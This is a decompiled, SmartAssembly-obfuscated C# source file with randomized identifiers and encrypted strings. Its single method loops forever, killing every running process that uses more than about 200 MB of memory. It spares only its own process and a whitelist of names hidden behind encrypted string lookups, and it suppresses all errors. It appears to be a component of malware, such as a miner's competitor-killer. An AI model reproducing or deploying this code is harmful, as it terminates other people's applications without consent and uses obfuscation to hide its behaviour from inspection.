using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace OlVheIVabxHnbNp;

public static class YBSRicIqkep
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void PcNMvXIFOHISG()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107405471)) && !process.ProcessName.Contains(getString_0(107405462)) && !process.ProcessName.Contains(getString_0(107405421)) && !process.ProcessName.Contains(getString_0(107405412)) && !process.ProcessName.Contains(getString_0(107405431)) && !process.ProcessName.Contains(getString_0(107405386)) && !process.ProcessName.Contains(getString_0(107405405)) && !process.ProcessName.Contains(getString_0(107405360)) && !process.ProcessName.Contains(getString_0(107405347)) && !process.ProcessName.Contains(getString_0(107405366)) && !process.ProcessName.Contains(getString_0(107405345)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static YBSRicIqkep()
	{
		Strings.CreateGetStringDelegate(typeof(YBSRicIqkep));
	}
}
